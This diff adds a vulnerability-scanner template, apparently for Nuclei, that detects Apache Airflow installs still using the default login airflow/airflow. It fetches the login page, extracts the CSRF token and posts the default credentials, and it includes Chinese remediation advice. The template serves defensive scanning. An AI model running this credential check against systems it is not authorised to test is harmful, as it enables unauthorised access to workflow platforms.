@@ -1,0 +1,55 @@
+id: airflow-default-login
+info:
+  name: Apache Airflow Default Login
+  author:
+  - l0ne1y
+  description: |-
+    Apache Airflow默认口令登录漏洞
+    Apache Airflow是美国阿帕奇（Apache）软件基金会的一套用于创建、管理和监控工作流程的开源平台。该平台具有可扩展和动态监控等特点。在安装时存在默认弱口令airflow/airflow
+  severity: high
+  remediation: |-
+    修复方案：
+    1、建议系统管理人员将已发现的弱口令立即改成强口令。
+    2、弱口令重在管理。企业应制定强口令制度（如：密码需包含大小写字母、数字、特殊字符至少三种格式，长度不少于十位，并且密码键盘排列无序，密码企业、个人信息无关联。
+    3、推荐强口令在线生成:[https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
+    4、推荐口令强度在线检测:[https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - contains(body_1, "Sign In - Airflow")
+    - contains(all_headers_2, "session=.")
+    - status_code_2 == 302
+  - type: word
+    words:
+    - 'You should be redirected automatically to target URL: <a href="/">'
+  extractors:
+  - name: csrf_token
+    type: regex
+    regex:
+    - type="hidden" value="(.*?)">
+    group: 1
+    internal: true
+  matchers-condition: and
+  raw:
+  - |
+    GET /login/ HTTP/1.1
+    Host: {{Hostname}}
+    Origin: {{BaseURL}}
+  - |
+    POST /login/ HTTP/1.1
+    Host: {{Hostname}}
+    Origin: {{BaseURL}}
+    Content-Type: application/x-www-form-urlencoded
+    Referer: {{BaseURL}}/admin/airflow/login
+
+    username={{username}}&password={{password}}&_csrf_token={{csrf_token}}
+  attack: pitchfork
+  payloads:
+    password:
+    - airflow
+    username:
+    - airflow
+  cookie-reuse: true
+  req-condition: true
